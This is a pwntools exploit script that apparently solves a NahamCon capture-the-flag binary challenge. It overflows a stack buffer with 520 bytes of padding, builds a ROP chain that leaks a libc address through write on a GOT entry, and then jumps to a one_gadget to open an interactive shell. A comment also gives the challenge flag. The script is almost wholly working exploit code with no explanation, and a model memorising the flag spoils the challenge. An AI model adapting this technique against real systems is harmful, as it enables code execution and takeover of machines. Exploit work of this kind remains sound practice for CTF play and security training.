#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./all_patched_up")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

sshc = None
r = None
nc = "nc challenge.nahamcon.com 32753"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def main():
    global r
    r = conn()
    
    pop_rsi = 0x0000000000401251 # rsi, r15
    pops = 0x000000000040124c # r12 13 14 15
    
    payload = b"a"*520
    payload += p64(pop_rsi) + p64(exe.got.write) * 2
    payload += p64(exe.symbols.write)
    payload += p64(exe.symbols.main)
    
    r.sendline(payload)
    
    r.recvuntil(b"> ")
    leak = u64(r.recv(6).ljust(8, b"\0"))
    logh("Leak", leak)
    
    libc_base = leak - libc.symbols.write
    logh("Libc base", libc_base)
    
    one_gadget = libc_base + 0xe3afe

    payload = b"a"*520
    payload += p64(pops) + p64(0) * 4 # setup r12 for one gadget
    payload += p64(one_gadget)
    
    r.sendline(payload)

    r.interactive() # flag{499c6288c77f297f4fd87db8e442e3f0}


if __name__ == "__main__":
    main()

